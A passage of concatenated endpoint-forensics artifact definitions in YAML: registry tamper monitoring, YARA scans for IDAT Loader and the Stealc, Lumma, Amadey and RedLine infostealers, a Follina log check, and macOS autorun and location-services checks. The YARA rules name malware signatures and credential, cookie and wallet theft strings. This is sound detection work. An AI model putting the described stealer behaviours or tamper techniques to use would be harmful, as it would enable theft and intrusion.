        ^HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\,,,"Windows: Malware likes changing IFEO, like adding Debugger to disable antivirus EXE",T1183
        ^HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\,,,Windows: Event log system integrity and ACLs,
        ^HKLM\\SYSTEM\\CurrentControlSet\\Control\\Safeboot\\,,,Windows: Services approved to load in safe mode. Almost nothing should ever modify this.,Tamper-Safemode
        ^HKLM\\SYSTEM\\CurrentControlSet\\Control\\Winlogon\\,,,Windows: Providers notified by WinLogon,Tamper-Winlogon
        ^HKLM\\Software\\Microsoft\\Tracing\\RASAPI32,,,Windows: Malware sometimes disables tracing to obfuscate tracks,Tamper-Tracing
        \\{CAFEEFAC-,,,Java Registry,
        

sources:
  - query: |
      -- firstly generate initial regex to apply to events
      LET target_entries = join(array=KeyRegex.Regex,sep='|')
      
      -- Monitor ETW provider and extract target key event by regex
      LET hits = SELECT 
            EventData.UtcTime as EventTime,
            System.ID as EventId,
            EventData.EventType as EventType,
            EventData.TargetObject as TargetObject,
            EventData.Details as Value,
            dict(Image=EventData.Image,User=EventData.User,ProcessId=EventData.ProcessId,ProcessGuid=EventData.ProcessGuid) as ProcessInfo,
            EventData.Image as _Image
        FROM watch_etw(guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}")
        WHERE System.ID in ( 12, 13, 14 )
            AND TargetObject =~ target_entries

      -- apply additional filters and add context.
      SELECT *, process_tracker_callchain(id=ProcessInfo.ProcessId).Data as ProcessChain
      FROM foreach(row=hits, query={
          SELECT EventTime,EventId,EventType,TargetObject,Value,ProcessInfo,
            dict(Regex=Regex,FilterRegex=FilterRegex,FilterProcess=FilterProcess,Details=Details,`ATT&CK`=`ATT&CK`) as Detection
          FROM KeyRegex
          WHERE TargetObject =~ Regex
            AND NOT if(condition= FilterProcess,
                        then= _Image =~ FilterProcess,
                        else= False)
            AND NOT if(condition= FilterRegex,
                        then= TargetObject =~ FilterRegex,
                        else= False)
      })

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.System.Man.yaml
======
name: MacOS.System.Man

type: CLIENT

author: Wes Lambert - @therealwlambert|@weslambert@infosec.exchange

description: |
    `man` is typically used to provide information about how to use various commands. It's configuration file is located at `/private/etc/man.conf` on most macOS systems.
    
    While root access is required to do so, this configuration could be modified by an adversary to stealthily achieve persistence in an environment. 
    
    This artifact collects any entries in `man.conf` which appear to specify a non-default binary for use with `man` or `whatis`.

reference:
  - https://theevilbit.github.io/beyond/beyond_0030
  - https://www.youtube.com/watch?v=teq6r7XbBug

parameters:
  - name: ManGlob
    default: /private/etc/man.conf
    description: Default file path for `man` configuration.

precondition:
      SELECT OS From info() where OS = 'darwin'

sources:
  - query: |
      LET ManList = SELECT OSPath, Mtime FROM glob(globs=split(string=ManGlob, sep=","))
      SELECT * FROM foreach(
        row=ManList, 
        query={ 
            SELECT 
                OSPath, 
                Mtime, 
                Line 
            FROM parse_lines(filename=OSPath) 
      WHERE Line =~ '^(MAN|WHATIS||)PAGER' 
      AND NOT Line =~ "/usr/bin/less|/usr/bin/more" })

---END OF FILE---

======
FILE: /content/exchange/artifacts/IdatLoader.yaml
======
name: Windows.Detection.IdatLoader
author: Matt Green - @mgreen27
description: |
  This artifact enables running Yara over processes in memory.
  Targeting detection of IDAT Loader and final payloads 
  observed in field.  
  
  Note: may see some false positives on security tools, 
  add to whitelist appropriately.

type: CLIENT
reference:
  - https://www.rapid7.com/blog/post/2023/08/31/fake-update-utilizes-new-idat-loader-to-execute-stealc-and-lumma-infostealers/
  
parameters:
  - name: ProcessRegex
    default: .
    type: regex
  - name: PidRegex
    default: .
    type: regex
  - name: UploadHits
    type: bool
  - name: YaraRule
    type: yara
    description: Final Yara option and the default if no other options provided.
    default: |
        rule MAL_Loader_IDAT_August_2023
        {
            meta:
                description = "IDAT Loader August 2023"
                author = "Natalie Zargarov"
            strings:
                $trait_0 = {C6 A5 79 EA F4 B4 07 9A}
                $trait_1 = {3D ED C0 D3}
                $trait_2 = {C6 45 FC 4D C6 45 FD 5A}
                $trait_3 = {68 77 94 91 2C 8B 45 ?? 50 E8}
            condition:
                2 of ($trait_*)
        }
        
        rule MAL_Loader_IDAT_Shellcode_Dec_2023
        {
             meta:
                author = "Thomas Elkins - Rapid7"
                description = "Yara detects in memory IDAT Loader shellcode"
                date = "20-12-2023"
                
            strings:
                $stage1_32_1 = { 8B D1 8D 04 09 D1 EA 33 D0 8D 04 09 56 81 E2 55 55 55 55 33 D0 8B F2 8B C2 C1 E0 02 C1 EE 02 33 } // function from IDAT API Hashing Routine
                $stage1_32_2 = { 8A 44 0D 08 30 04 32 8D 41 01 83 E9 03 42 F7 D9 1B C9 23 C8 3B D7 72 E8 } // XOR encrpytion routine for creation of encrypted temp file
                $stage1_64_1 = { 8B 44 24 08 25 55 55 55 55 D1 E0 8B 4C 24 08 D1 E9 81 E1 55 55 55 55 0B C1 89 44 24 08 } // function from IDAT API Hashing Routine
                $stage1_64_2 = { 8B 04 24 8B 4C 24 04 0F B6 4C 0C 08 48 8B 54 24 20 0F B6 04 02 33 C1 8B 0C 24 48 8B 54 24 20 88 } // XOR encryption for creation of encrypted temp file
                $stage2_1 = { FF 57 0C 33 D2 6A 1A 59 F7 F1 66 0F BE 44 15 DC 66 89 04 73 46 3B 75 FC 72 E6 } // Function turns computer name into UpperCase only characters using srand function
                $stage2_2 = { 8B 00 33 04 8A 8B 4D E8 89 01 8B 55 E4 83 EA 01 39 55 F4 75 } // decryption loop for final payload
                
            condition:
                2 of ($stage1_32_*) or 2 of ($stage1_64_*) or 2 of ($stage2_*)
        }
        
        rule win_stealc_w0 {
           meta:
               malware = "Stealc"
               description = "Find standalone Stealc sample based on decryption routine or characteristic strings"
               reference = "https://blog.sekoia.io/stealc-a-copycat-of-vidar-and-raccoon-infostealers-gaining-in-popularity-part-1/"
               author = "crep1x"
               notes = "removed MZ header condition"
           strings:
               $dec = { 55 8b ec 8b 4d ?? 83 ec 0c 56 57 e8 ?? ?? ?? ?? 6a 03 33 d2 8b f8 59 f7 f1 8b c7 85 d2 74 04 } //deobfuscation function
               
               $str01 = "------" ascii
               $str02 = "Network Info:" ascii
               $str03 = "- IP: IP?" ascii
               $str04 = "- Country: ISO?" ascii
               $str05 = "- Display Resolution:" ascii
               $str06 = "User Agents:" ascii
               $str07 = "%s\\%s\\%s" ascii
           condition:
                ($dec or 5 of ($str*))
        }
        
        rule win_lumma_auto {
            meta:
                author = "Felix Bilstein - yara-signator at cocacoding dot com"
                date = "2023-07-11"
                description = "Detects win.lumma."
            strings:
                $sequence_0 = { 57 53 ff767c ff7678 }
                $sequence_1 = { 53 49 83fc00 75e8 8b4508 49 89ca }
                $sequence_2 = { e8???????? ff7614 e8???????? ff7608 e8???????? 83c414 83c8ff }
                $sequence_3 = { 4d 6be404 49 83ec04 }
                $sequence_4 = { 41 5b 41 5c }
                $sequence_5 = { c1e002 50 e8???????? 894614 8b461c c1e002 }
                $sequence_6 = { 0fb64203 83c204 33c1 c1e908 }
                $sequence_7 = { 41 5a cb 55 89e5 8b550c }
                $sequence_8 = { 4d 6bdb08 4c 01dc }
                $sequence_9 = { 50 e8???????? 894604 8b461c }
                $sequence_10 = { 41 8b0a 41 8b5204 }
                $sequence_11 = { 4d 89f3 49 83eb04 }
                $sequence_12 = { 57 8bf2 8bd9 6a2e 56 }
                $sequence_13 = { 03c0 3bc2 0f47d0 e8???????? 85c0 }
                $sequence_14 = { c1e002 50 e8???????? 89460c 8b461c c1e002 }
            condition:
                7 of them
        }
        
        rule win_amadey_auto {
            meta:
                author = "Felix Bilstein - yara-signator at cocacoding dot com"
                date = "2023-07-11"
                description = "Detects win.amadey."
            strings:
                $sequence_0 = { 8945f4 837df408 744f 8d85e8fdffff 890424 e8???????? c70424???????? }
                $sequence_1 = { c745fc00000000 e8???????? 84c0 750c c7042401000000 e8???????? e8???????? }
                $sequence_2 = { 89442404 891424 e8???????? 85c0 7510 8b45fc 40 }
                $sequence_3 = { 890424 e8???????? c7042400000000 e8???????? 81c424040000 }
                $sequence_4 = { e8???????? 8945f4 837df40a 0f842e010000 }
                $sequence_5 = { e8???????? c7442404???????? 8b4508 890424 e8???????? 85c0 7e75 }
                $sequence_6 = { 890424 e8???????? c7042401000000 e8???????? 89442404 8d85e8fbffff 890424 }
                $sequence_7 = { e8???????? 8b4508 c60000 c9 }
                $sequence_8 = { 68???????? e8???????? 8d4dcc e8???????? 83c418 }
                $sequence_9 = { 83fa10 722f 8b8d78feffff 42 8bc1 81fa00100000 7214 }
                $sequence_10 = { 52 51 e8???????? 83c408 8b955cfeffff }
                $sequence_11 = { 50 68???????? 83ec18 8bcc 68???????? }
                $sequence_12 = { 8b7dfc 8d4201 3bcb 7ccb 837e1410 }
                $sequence_13 = { 83c408 8b554c c7453000000000 c745340f000000 c6452000 83fa10 0f8204ffffff }
                $sequence_14 = { 68e8030000 ff15???????? 8b551c 83fa10 7228 8b4d08 }
                $sequence_15 = { 83fa10 722f 8b8d60feffff 42 }
                $sequence_16 = { 68???????? e8???????? 8d4db4 e8???????? 83c418 }
                $sequence_17 = { c78514feffff0f000000 c68500feffff00 83fa10 722f 8b8de8fdffff 42 }
                $sequence_18 = { 83c408 8b95fcfdffff c78510feffff00000000 c78514feffff0f000000 c68500feffff00 83fa10 }
            condition:
                7 of them
        }
        
        rule MALWARE_Win_RedLine {
            meta:
                author = "ditekSHen"
                description = "Detects RedLine infostealer"
                clamav_sig = "MALWARE.Win.Trojan.RedLine-1, MALWARE.Win.Trojan.RedLine-2"
            strings:
                $s1 = { 23 00 2b 00 33 00 3b 00 43 00 53 00 63 00 73 00 }
                $s2 = { 68 10 84 2d 2c 71 ea 7e 2c 71 ea 7e 2c 71 ea 7e
                        32 23 7f 7e 3f 71 ea 7e 0b b7 91 7e 2b 71 ea 7e
                        2c 71 eb 7e 5c 71 ea 7e 32 23 6e 7e 1c 71 ea 7e
                        32 23 69 7e a2 71 ea 7e 32 23 7b 7e 2d 71 ea 7e }
                $s3 = { 83 ec 38 53 b0 ?? 88 44 24 2b 88 44 24 2f b0 ??
                        88 44 24 30 88 44 24 31 88 44 24 33 55 56 8b f1
                        b8 0c 00 fe ff 2b c6 89 44 24 14 b8 0d 00 fe ff
                        2b c6 89 44 24 1c b8 02 00 fe ff 2b c6 89 44 24
                        18 b3 32 b8 0e 00 fe ff 2b c6 88 5c 24 32 88 5c
                        24 41 89 44 24 28 57 b1 ?? bb 0b 00 fe ff b8 03
                        00 fe ff 2b de 2b c6 bf 00 00 fe ff b2 ?? 2b fe
                        88 4c 24 38 88 4c 24 42 88 4c 24 47 c6 44 24 34
                        78 c6 44 24 35 61 88 54 24 3a c6 44 24 3e 66 c6
                        44 24 41 33 c6 44 24 43 ?? c6 44 24 44 74 88 54
                        24 46 c6 44 24 40 ?? c6 44 24 39 62 c7 44 24 10 }
                $s4 = "B|BxBtBpBlBhBdB`B\\BXBTBPBLBHBDB@B<B8B4B0B,B(B$B B" fullword wide
                $s5 = " delete[]" fullword ascii
                $s6 = "constructor or from DllMain." ascii
        
                $x1 = "RedLine.Reburn" ascii
                $x2 = "RedLine.Client." ascii
                $x3 = "hostIRemotePanel, CommandLine: " fullword wide
                $u1 = "<ParseCoinomi>" ascii
                $u2 = "<ParseBrowsers>" ascii
                $u3 = "<GrabScreenshot>" ascii
                $u4 = "UserLog" ascii nocase
                $u5 = "FingerPrintT" fullword ascii
                $u6 = "InstalledBrowserInfoT" fullword ascii
                $u7 = "RunPE" fullword ascii
                $u8 = "DownloadAndEx" fullword ascii
                $u9 = ".Data.Applications.Wallets" ascii
                $u10 = ".Data.Browsers" ascii
                $u11 = ".Models.WMI" ascii
                $u12 = "DefenderSucks" wide
        
                $pat1 = "(((([0-9.])\\d)+){1})" fullword wide
                $pat2 = "^(?:2131|1800|35\\\\d{3})\\\\d{11}$" fullword wide
                $pat3 = "6(?:011|5[0-9]{2})[0-9]{12}$/C" fullword wide
                $pat4 = "Telegramprofiles^(6304|6706|6709|6771)[0-9]{12,15}$" fullword wide
                $pat5 = "host_key^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$" fullword wide
                $pat6 = "^3(?:0[0-5]|[68][0-9])[0-9]{11}$" wide
                $pat7 = "settingsprotocol^(5018|5020|5038|6304|6759|6761|6763)[0-9]{8,15}$" wide
                $pat8 = "Opera GX4[0-9]{12}(?:[0-9]{3})?$cookies" wide
                $pat9 = "^9[0-9]{15}$Coinomi" wide
                $pat10 = "wallets^(62[0-9]{14,17})$" wide
                $pat11 = "hostpasswordUsername_value" wide
                $pat12 = "credit_cards^389[0-9]{11}$" wide
                $pat13 = "NWinordVWinpn.eWinxe*WinhostUsername_value" wide
                $pat14 = /(\/|,\s)CommandLine:/ wide
                // another variant
                $v2_1 = "ListOfProcesses" fullword ascii
                $v2_2 = /get_Scan(ned)?(Browsers|ChromeBrowsersPaths|Discord|FTP|GeckoBrowsersPaths|Screen|Steam|Telegram|VPN|Wallets)/ fullword ascii
                $v2_3 = "GetArguments" fullword ascii
                $v2_4 = "VerifyUpdate" fullword ascii
                $v2_5 = "VerifyScanRequest" fullword ascii
                $v2_6 = "GetUpdates" fullword ascii
                // yet another variant
                $v3_1 = "localhost.IUserServiceu" fullword ascii
                $v3_2 = "ParseNetworkInterfaces" fullword ascii
                $v3_3 = "ReplyAction0http://tempuri.org/IUserService/GetUsersResponse" fullword ascii
                $v3_4 = "Action(http://tempuri.org/IUserService/GetUsersT" fullword ascii
                $v3_5 = "basicCfg" fullword wide
                // more variants
                $vx4_1 = "C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\AddInProcess32.exe" fullword wide
                $v4_2 = "isWow64" fullword ascii
                $v4_3 = "base64str" fullword ascii
                $v4_4 = "stringKey" fullword ascii
                $v4_5 = "BytesToStringConverted" fullword ascii
                $v4_6 = "FromBase64" fullword ascii
                $v4_7 = "xoredString" fullword ascii
                $v4_8 = "procName" fullword ascii
                $v4_9 = "base64EncodedData" fullword ascii
                // another variant 2021-10-23
                $v5_1 = "DownloadAndExecuteUpdate" fullword ascii
                $v5_2 = "ITaskProcessor" fullword ascii
                $v5_3 = "CommandLineUpdate" fullword ascii
                $v5_4 = "DownloadUpdate" fullword ascii
                $v5_5 = "FileScanning" fullword ascii
                $v5_6 = "GetLenToPosState" fullword ascii
                $v5_7 = "RecordHeaderField" fullword ascii
                $v5_8 = "EndpointConnection" fullword ascii
                $v5_9 = "BCRYPT_KEY_LENGTHS_STRUCT" fullword ascii
                // another variant (v11?)
                $v6_1 = "%localappdata%\\" fullword wide
                $v6_2 = "GetDecoded" fullword ascii
                $v6_3 = "//settinString.Removeg[@name=\\PasswString.Removeord\\]/valuString.RemoveeROOT\\SecurityCenter" fullword wide
                $v6_4 = "AppData\\Roaming\\ //settString.Replaceing[@name=\\UString.Replacesername\\]/vaString.Replaceluemoz_cookies" wide
                $v6_5 = "<GetWindowsVersion>g__HKLM_GetString|11_0" fullword ascii
                $v6_6 = "net.tcp://" fullword wide
                
            condition:
                (all of ($s*) or 2 of ($x*) or 7 of ($u*) or 7 of ($pat*) or (1 of ($x*) and (5 of ($u*) or 2 of ($pat*))) or 5 of ($v2*) or 4 of ($v3*) or (3 of ($v2*) and (2 of ($pat*) or 2 of ($u*)) or (1 of ($vx4*) and 5 of ($v4*)) or 5 of ($v4*) or 6 of ($v5*)) or 5 of ($v6*) or (4 of ($v6*) and 3 of them )) or ((all of ($x*) and 4 of ($s*)) or (4 of ($v6*) and 4 of them))
        }

  - name: NumberOfHits
    description: THis artifact will stop by default at one hit. This setting allows additional hits
    default: 1
    type: int
  - name: ContextBytes
    description: Include this amount of bytes around hit as context.
    default: 0
    type: int64
  - name: ExePathWhitelist
    description: Regex of ProcessPaths to exclude
    type: regex
    default: "C:\\Program Files\\Sophos\\"


sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      SELECT Pid,ProcessName,ExePath,CommandLine,
        Rule,Meta,YaraString,HitOffset, HitContext,
        process_tracker_callchain(id=Pid).data as ProcessChain
      FROM Artifact.Windows.Detection.Yara.Process(
                PidRegex=PidRegex,
                ProcessRegex=ProcessRegex,
                YaraRule=YaraRule,
                YaraRule=YaraRule,
                NumberOfHits=str(str=NumberOfHits),
                ContextBytes=ContextBytes,
                ExePathWhitelist=ExePathWhitelist )

column_types:
  - name: HitContext
    type: preview_upload

---END OF FILE---

======
FILE: /content/exchange/artifacts/MsdtFollina.yaml
======
name: Windows.Detection.MsdtFollina
author: Matt Green - @mgreen27
description: |
   This artifact will search Microsoft Support Diagnostic Tool logs for evidence 
   of ms-msdt Follina exploitation (CVE-2022-30190).
   
   The exploit appears to add a recursive path "../../" to a TargetPath field 
   inside the PCW.debugreport.xml.
   
   PCW.debugreport.xml can be found inside %localappdata%\Diagnostics or 
   %localappdata%\ElevatedDiagnostics for elevated instances.
   
reference:
  - https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e
  - https://twitter.com/nas_bench/status/1531718490494844928
   

parameters:
   - name: TargetGlob
     default: C:\Users\*\AppData\Local\{Diagnostics,ElevatedDiagnostics}\**\PCW.debugreport.xml
   - name: MsdtYara
     default: |
        rule msdt
        {
            meta:
                description = "Simple yara to detect folder traversal string used in MSDT follina exploitation"
                date = "2022/06/01"
            strings:
                $a = "../../"
            condition:
                $a
        }

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      SELECT FullPath, Size,Mtime,Atime,Ctime,Btime,Rule,Meta,
        read_file(filename=FullPath) as Content
      FROM Artifact.Generic.Detection.Yara.Glob(PathGlob=TargetGlob,YaraRule=MsdtYara)

---END OF FILE---

======
FILE: /content/exchange/artifacts/KnockKnock.yaml
======
name: MacOS.Forensics.KnockKnock
author: Matt Green - @mgreen27
description: |
    This artifact will run Knocknock to collect autorun output.

reference:
  - https://objective-see.org/products/knockknock.html

required_permissions:
  - EXECVE

tools:
  - name: KnockKnock
    url: https://github.com/objective-see/KnockKnock/releases/download/v2.5.0/KnockKnock_2.5.0.zip
    expected_hash: 1ba31195a8312b97c40955db3c554947b261a82c319d29cface4619fa50f3daa
    version: 2.5.0
    serve_locally: true
    

precondition: SELECT OS From info() where OS = 'darwin'

parameters:
  - name: IncludeAppleItems
    description: Include apple/system items.
    type: bool
  - name: QueryVT
    description: If Selected will query VirusTotal. Using this switch is not reccomended - enrich server side instead.
    type: bool

sources:
  - name: Authorization Plugins
    query: |
      LET tool <= SELECT *
        FROM Artifact.Generic.Utils.FetchBinary(ToolName="KnockKnock", IsExecutable='N')
      LET tempfolder <= tempdir()
        
      LET bin <= SELECT * FROM unzip(filename=tool.OSPath[0],output_directory=tempfolder)
      
      LET other_commands = if(condition=IncludeAppleItems AND  QueryVT,
                                then= ['-apple'],
                     else = if(condition=IncludeAppleItems AND NOT QueryVT,
                                then= ['-apple','-skipVT'],
                     else = if(condition= NOT IncludeAppleItems AND NOT QueryVT,
                                then= ['-skipVT'],
                     else= '')))
      
      LET results <= SELECT parse_json(data=Stdout) as KnockKnockResults 
        FROM execve(argv=[tempfolder + '/KnockKnock.app/Contents/MacOS/KnockKnock','-whosthere',other_commands],length=10000000)

      SELECT * FROM foreach(
            row=results.KnockKnockResults.`Authorization Plugins`,
            query={SELECT * FROM foreach(row=_value)} )
            
  - name: Browser Extensions
    query: |
      SELECT * FROM foreach(
            row=results.KnockKnockResults.`Browser Extensions`,
            query={SELECT * FROM foreach(row=_value)} )
            
  - name: Background Managed Tasks
    query: |
      SELECT * FROM foreach(
            row=results.KnockKnockResults.`Background Managed Tasks`,
            query={SELECT * FROM foreach(row=_value)} )

  - name: Cron Jobs
    query: |
      SELECT * FROM foreach(
            row=results.KnockKnockResults.`Cron Jobs`,
            query={SELECT * FROM foreach(row=_value)} )

  - name: Dir. Services Plugins
    query: |
      SELECT * FROM foreach(
            row=results.KnockKnockResults.`Dir. Services Plugins`,
            query={SELECT * FROM foreach(row=_value)} )

  - name: Dock Tiles Plugins
    query: |
      SELECT * FROM foreach(
            row=results.KnockKnockResults.`Dock Tiles Plugins`,
            query={SELECT * FROM foreach(row=_value)} )

  - name: Event Rules
    query: |
      SELECT * FROM foreach(
            row=results.KnockKnockResults.`Event Rules`,
            query={SELECT * FROM foreach(row=_value)} )

  - name: Extensions and Widgets
    query: |
      SELECT * FROM foreach(
            row=results.KnockKnockResults.`Extensions and Widgets`,
            query={SELECT * FROM foreach(row=_value)} )

  - name: Kernel Extensions
    query: |
      SELECT * FROM foreach(
            row=results.KnockKnockResults.`Kernel Extensions`,
            query={SELECT * FROM foreach(row=_value)} )

  - name: Launch Items
    query: |
      SELECT * FROM foreach(
            row=results.KnockKnockResults.`Launch Items`,
            query={SELECT * FROM foreach(row=_value)} )

  - name: Library Inserts
    query: |
      SELECT * FROM foreach(
            row=results.KnockKnockResults.`Library Inserts`,
            query={SELECT * FROM foreach(row=_value)} )
            
  - name: Library Proxies
    query: |
      SELECT * FROM foreach(
            row=results.KnockKnockResults.`Library Proxies`,
            query={SELECT * FROM foreach(row=_value)} )
            
  - name: Login Items
    query: |
      SELECT * FROM foreach(
            row=results.KnockKnockResults.`Login Items`,
            query={SELECT * FROM foreach(row=_value)} )
            
  - name: Login/Logout Hooks
    query: |
      SELECT * FROM foreach(
            row=results.KnockKnockResults.`Login/Logout Hooks`,
            query={SELECT * FROM foreach(row=_value)} )
            
  - name: Periodic Scripts
    query: |
      SELECT * FROM foreach(
            row=results.KnockKnockResults.`Periodic Scripts`,
            query={SELECT * FROM foreach(row=_value)} )
            
  - name: Quicklook Plugins
    query: |
      SELECT * FROM foreach(
            row=results.KnockKnockResults.`Quicklook Plugins`,
            query={SELECT * FROM foreach(row=_value)} )
            
  - name: Library Inserts
    query: |
      SELECT * FROM foreach(
            row=results.KnockKnockResults.`Library Inserts`,
            query={SELECT * FROM foreach(row=_value)} )
            
  - name: Spotlight Importers
    query: |
      SELECT * FROM foreach(
            row=results.KnockKnockResults.`Spotlight Importers`,
            query={SELECT * FROM foreach(row=_value)} )
            
  - name: Startup Scripts
    query: |
      SELECT * FROM foreach(
            row=results.KnockKnockResults.`Startup Scripts`,
            query={SELECT * FROM foreach(row=_value)} )
            
  - name: System Extensions
    query: |
      SELECT * FROM foreach(
            row=results.KnockKnockResults.`System Extensions`,
            query={SELECT * FROM foreach(row=_value)} )

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.System.LocationServices.yaml
======
name: MacOS.System.LocationServices
description: |
   This artifact looks for applications that are registered and allowed for use of location services by checking the plist file in `/var/db/locationd/clients.plist`.  
   This can be useful to help determine if these settings have been modified by an attacker to perform location tracking.
   
   For more information about how location services could be abused, see the following:
   
   https://medium.com/@slyd0g/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71

type: CLIENT

author: Wes Lambert - @therealwlambert

parameters:
  - name: LocationPath
    default: /var/db/locationd/clients.plist

precondition:
      SELECT OS From info() where OS = 'darwin'

sources:
  - query: |
      LET LocGlob <= SELECT FullPath FROM glob(globs=LocationPath)
      LET LocationPlist = SELECT * FROM plist(file=LocGlob.FullPath)
      LET SepApps = SELECT * FROM foreach(row={SELECT _value AS Apps FROM items(item=LocationPlist)}, query={SELECT _value AS App FROM items(item=Apps)})
      SELECT
        App.BundleId AS BundleId,
        App.BundlePath As BundlePath,
        App.Whitelisted AS Whitelisted,
        App.Authorized AS Authorized,
        App.Hide AS Hide,
        App.Registered As Registered,
        App.Requirement AS Requirement,
        App AS _Data
      FROM SepApps

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.EventLogs.Hayabusa.yaml
======
name: Windows.EventLogs.Hayabusa
description: |
   [Hayabusa](https://github.com/Yamato-Security/hayabusa) is a
   Windows event log fast forensics timeline generator and threat
   hunting tool.

   This artifact runs Hayabusa on the endpoint against the specified
   Windows event log directory, and generates and uploads a single CSV/JSONL
   file for further analysis with excel, timeline explorer, elastic
   stack, jq, etc.

author: Eric Capuano - @eric_capuano, Whitney Champion - @shortxstack, Zach Mathis - @yamatosecurity, Fukusuke Takahashi - @fukusuket

tools:
 - name: Hayabusa-3.2.0
   url: https://github.com/Yamato-Security/hayabusa/releases/download/v3.2.0/hayabusa-3.2.0-win-x64-live-response.zip
   expected_hash: 0110a7414de0af39bffb84ce07488fbf193320476f56c4bd2cdb2e06f5dee712
   version: 3.2.0

precondition: SELECT OS From info() where OS = 'windows'

parameters:
 - name: EvtxDirectory
   description: "Directory of .evtx files"
   default: C:/Windows/System32/winevt/Logs
 - name: MinimalLevel
   description: "Minimum level for rules"
   default: medium
   type: choices
   choices:
     - informational
     - low
     - medium
     - high
     - critical
 - name: OutputFormat
   description: "Choose the format of the result file"
   default: csv
   type: choices
   choices:
     - csv
     - jsonl
 - name: OutputProfile
   description: "Decide how much data you want back"
   default: standard
   type: choices
   choices:
     - minimal
     - standard
     - verbose
     - all-field-info
     - all-field-info-verbose
     - super-verbose
     - timesketch-minimal
     - timesketch-verbose
 - name: OutputTimeFormat
   description: "Choose the format of timestamp"
   default: ISO-8601
   type: choices
   choices:
     - European-time
     - ISO-8601
     - RFC-2822
     - RFC-3339
     - US-military-time
     - US-time
     - UTC
 - name: Threads
   description: "Number of threads"
   type: int
   default: 4
 - name: UpdateRules
   description: "Update rules before scanning"
   type: bool
   default: Y
 - name: Sort
   description: "Sort events before saving the file"
   type: bool
   default: N
 - name: NoisyRules
   description: "Enable rules marked as noisy"
   type: bool
   default: N
 - name: EIDFilter
   description: "Scan only common Event IDs for quicker scans"
   type: bool
   default: N
 - name: TimeOffset
   description: "Scan recent events based on an offset (ex: 1y, 3M, 30d, 24h, 30m)"
 - name: TimelineStart
   description: "Start time of the event logs to load (ex: '2020-02-22 00:00:00 +09:00')"
 - name: TimelineEnd
   description: "End time of the event logs to load (ex: '2022-02-22 23:59:59 +09:00')"
 - name: ExcludeCategory
   description: "Do not load rules with specified logsource categories (ex: process_creation,pipe_created)"
 - name: ExcludeEID
   description: "Do not scan specific EIDs for faster speed (ex: 1) (ex: 1,4688)"
 - name: ExcludeStatus
   description: "Do not load rules according to status (ex: experimental) (ex: stable,test)"
 - name: ExcludeTag
   description: "Do not load rules with specific tags (ex: sysmon)"
 - name: IncludeCategory
   description: "Only load rules with specified logsource categories (ex: process_creation,pipe_created)"
 - name: IncludeEID
   description: "Scan only specified EIDs for faster speed (ex: 1) (ex: 1,4688)"
 - name: IncludeTag
   description: "Only load rules with specific tags (ex: attack.execution,attack.discovery)"

sources:
 - name: Upload
   query: |
        -- Fetch the binary
        LET Toolzip <= SELECT FullPath
        FROM Artifact.Generic.Utils.FetchBinary(ToolName="Hayabusa-3.2.0", IsExecutable=FALSE)

        LET TmpDir <= tempdir()

        -- Unzip the binary
        LET _ <= SELECT *
        FROM unzip(filename=Toolzip.FullPath, output_directory=TmpDir)

        LET HayabusaExe <= TmpDir + '\\hayabusa-3.2.0-win-x64.exe'

        -- Optionally update the rules
        LET _ <= if(condition=UpdateRules, then={
        SELECT * FROM execve(argv=[HayabusaExe, 'update-rules'], cwd=TmpDir) })

        LET HayabusaCmd <= if(condition=OutputFormat = "csv", then="csv-timeline", else="json-timeline")
        LET ResultFile <= TmpDir + '\\hayabusa_results.' + OutputFormat

        -- Build the command line considering all options
        -- If it does not match if(condition...), it returns Null, so remove Null with filter(....regex=".+")
        LET cmdline <= filter(list=(
          HayabusaExe, HayabusaCmd,
          "--no-wizard", 
          "--quiet", "--no-summary",
          "--directory", EvtxDirectory, 
          "--output", ResultFile,
          "--min-level", MinimalLevel,
          "--profile", OutputProfile,
          "--" + OutputTimeFormat,
          "--threads", str(str=Threads),
          if(condition=OutputFormat = "jsonl", then="-L"),
          if(condition=Sort, then="--sort"),
          if(condition=NoisyRules, then="--enable-noisy-rules"),
          if(condition=EIDFilter, then="--eid-filter"),
          if(condition=TimeOffset, then="--time-offset"),           if(condition=TimeOffset, then=TimeOffset),
          if(condition=TimelineStart, then="--timeline-start"),     if(condition=TimelineStart, then=TimelineStart),
          if(condition=TimelineEnd, then="--timeline-end"),         if(condition=TimelineEnd, then=TimelineEnd),
          if(condition=ExcludeCategory, then="--exclude-category"), if(condition=ExcludeCategory, then=ExcludeCategory),
          if(condition=ExcludeEID, then="--exclude-eid"),           if(condition=ExcludeEID, then=ExcludeEID),
          if(condition=ExcludeStatus, then="--exclude-status"),     if(condition=ExcludeStatus, then=ExcludeStatus),
          if(condition=ExcludeTag, then="--exclude-tag"),           if(condition=ExcludeTag, then=ExcludeTag),
          if(condition=IncludeCategory, then="--include-category"), if(condition=IncludeCategory, then=IncludeCategory),
          if(condition=IncludeEID, then="--include-eid"),           if(condition=IncludeEID, then=IncludeEID),
          if(condition=IncludeTag, then="--include-tag"),           if(condition=IncludeTag, then=IncludeTag),
        ), regex=".+")

        -- Run the tool and divert messages to logs.
        LET ExecHB <= SELECT *
        FROM execve(argv=cmdline, cwd=TmpDir, sep="\n", length=9999999)
        WHERE log(message=Stdout)

        -- Upload the raw file.
        SELECT upload(file=ResultFile) AS Uploads FROM scope()

 - name: Results
   query: |
        LET CSV_RESULT  = SELECT * FROM parse_csv(filename=ResultFile)
        LET JSONL_RESULT = SELECT * FROM parse_jsonl(filename=ResultFile)
        LET s = scope()
        
        SELECT *, timestamp(string=s.Timestamp || s.datetime) AS EventTime
        FROM if(condition= OutputFormat = "csv", then=CSV_RESULT, else=JSONL_RESULT)

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.Applications.Notes.yaml
======
name: MacOS.Applications.Notes
description: |
